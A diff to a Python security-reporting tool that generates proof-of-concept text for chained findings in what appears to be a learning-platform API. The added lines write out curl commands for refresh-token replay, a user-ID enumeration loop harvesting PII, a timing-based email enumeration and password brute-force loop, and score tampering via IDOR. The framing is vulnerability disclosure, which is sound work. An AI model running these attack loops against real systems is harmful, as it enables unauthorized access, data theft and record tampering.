@@ -628,6 +628,99 @@ def load_findings(findings_dir: str) -> list:
                     poc_lines.append("")
                     poc_lines.append("# Expected: 401 Unauthorized (invalid access token)")
                     poc_lines.append("# Actual: 200 OK — server silently re-authenticates using refresh token")
+                elif vtype == "exploit_chain":
+                    # Parse the chain detail to generate a full attack narrative
+                    api_base = "https://TARGET_API_BASE"
+                    # Try to extract API base from other findings in the same dir
+                    for other_fn in sorted(os.listdir(findings_dir)):
+                        if other_fn.endswith(".json") and other_fn != fn:
+                            try:
+                                with open(os.path.join(findings_dir, other_fn)) as of:
+                                    other = _json.load(of)
+                                    other_url = other.get("url", "")
+                                    if other_url.startswith("http"):
+                                        # Strip endpoint path — keep base up to /api/xxx/
+                                        import re as _re
+                                        base_match = _re.match(r'(https?://[^/]+(?:/api/[^/]+)?)', other_url)
+                                        if base_match:
+                                            api_base = base_match.group(1)
+                                            break
+                            except Exception:
+                                pass
+
+                    if "token" in detail.lower() and "idor" in detail.lower():
+                        poc_lines.append("ATTACK CHAIN: Token Bypass + IDOR = Persistent Unauthorized Access")
+                        poc_lines.append("=" * 60)
+                        poc_lines.append("")
+                        poc_lines.append("Step 1: Attacker logs in with their own account")
+                        poc_lines.append(f"  curl -sk -X POST '{api_base}/login-view/' \\")
+                        poc_lines.append("    -d 'email=attacker@example.com&password=AttackerPass' -c cookies.txt")
+                        poc_lines.append("")
+                        poc_lines.append("Step 2: Attacker extracts refresh token (cf_rt) from cookies")
+                        poc_lines.append("  cat cookies.txt | grep cf_rt")
+                        poc_lines.append("")
+                        poc_lines.append("Step 3: Even after access token (cf_at) expires, attacker uses")
+                        poc_lines.append("        the refresh token to silently re-authenticate:")
+                        poc_lines.append(f"  curl -sk -X POST '{api_base}/view-learner/' \\")
+                        poc_lines.append("    --cookie 'cf_at=EXPIRED; cf_rt=VALID_REFRESH_TOKEN' \\")
+                        poc_lines.append("    -d 'id=1'")
+                        poc_lines.append("")
+                        poc_lines.append("Step 4: With persistent access, attacker enumerates ALL users:")
+                        poc_lines.append(f"  for id in $(seq 1 100); do")
+                        poc_lines.append(f"    curl -sk -X POST '{api_base}/view-learner/' \\")
+                        poc_lines.append(f"      -b cookies.txt -d \"id=$id\"")
+                        poc_lines.append(f"  done")
+                        poc_lines.append("")
+                        poc_lines.append("IMPACT: Attacker maintains indefinite access to ALL user PII")
+                        poc_lines.append("        (names, emails, phone numbers) without valid credentials.")
+                    elif "rate" in detail.lower() and "timing" in detail.lower():
+                        poc_lines.append("ATTACK CHAIN: No Rate Limit + Timing Oracle = Account Enumeration + Brute Force")
+                        poc_lines.append("=" * 60)
+                        poc_lines.append("")
+                        poc_lines.append("Step 1: Enumerate valid emails using timing difference")
+                        poc_lines.append("        (valid emails take ~6.8s, invalid take ~0.1s)")
+                        poc_lines.append(f"  for email in $(cat email_wordlist.txt); do")
+                        poc_lines.append(f"    START=$(date +%s%N)")
+                        poc_lines.append(f"    curl -sk -X POST '{api_base}/reset-password-request/' \\")
+                        poc_lines.append(f"      -d \"email=$email\" -o /dev/null")
+                        poc_lines.append(f"    END=$(date +%s%N)")
+                        poc_lines.append(f"    ELAPSED=$(( (END-START)/1000000 ))")
+                        poc_lines.append(f"    if [ $ELAPSED -gt 3000 ]; then echo \"VALID: $email\"; fi")
+                        poc_lines.append(f"  done")
+                        poc_lines.append("")
+                        poc_lines.append("Step 2: Brute-force valid accounts (no rate limit)")
+                        poc_lines.append(f"  for pass in $(cat password_wordlist.txt); do")
+                        poc_lines.append(f"    curl -sk -X POST '{api_base}/login-view/' \\")
+                        poc_lines.append(f"      -d \"email=VALID_EMAIL&password=$pass\"")
+                        poc_lines.append(f"  done")
+                        poc_lines.append("")
+                        poc_lines.append("IMPACT: Attacker discovers valid accounts via timing, then")
+                        poc_lines.append("        brute-forces passwords with unlimited attempts.")
+                    elif "score" in detail.lower() and "idor" in detail.lower():
+                        poc_lines.append("ATTACK CHAIN: Score Manipulation + IDOR = Mass Grade Tampering")
+                        poc_lines.append("=" * 60)
+                        poc_lines.append("")
+                        poc_lines.append("Step 1: Attacker logs in as a learner")
+                        poc_lines.append(f"  curl -sk -X POST '{api_base}/login-view/' \\")
+                        poc_lines.append("    -d 'email=attacker@example.com&password=Pass' -c cookies.txt")
+                        poc_lines.append("")
+                        poc_lines.append("Step 2: Use IDOR to find target student IDs")
+                        poc_lines.append(f"  curl -sk -X POST '{api_base}/view-learner/' \\")
+                        poc_lines.append("    -b cookies.txt -d 'id=TARGET_STUDENT_ID'")
+                        poc_lines.append("")
+                        poc_lines.append("Step 3: Submit perfect scores for ANY student")
+                        poc_lines.append(f"  curl -sk -X POST '{api_base}/generate-live-test-result/' \\")
+                        poc_lines.append("    -b cookies.txt \\")
+                        poc_lines.append("    -d 'learner_id=TARGET_ID&correct_answers=999&total_score=99999"
+                                         "&live_test_id=1&total_question=10&total_marks=100'")
+                        poc_lines.append("")
+                        poc_lines.append("IMPACT: Any learner can inflate grades for any other student,")
+                        poc_lines.append("        or sabotage scores by setting them to 0.")
+                    else:
+                        poc_lines.append(f"Chain: {detail}")
+                        poc_lines.append(f"Evidence: {evidence}")
+                        poc_lines.append("")
+                        poc_lines.append("See individual findings above for reproduction steps.")
 
                 poc_text = "\n".join(poc_lines)
                 raw_line = f"[{sev.upper()}] {detail} {url}"
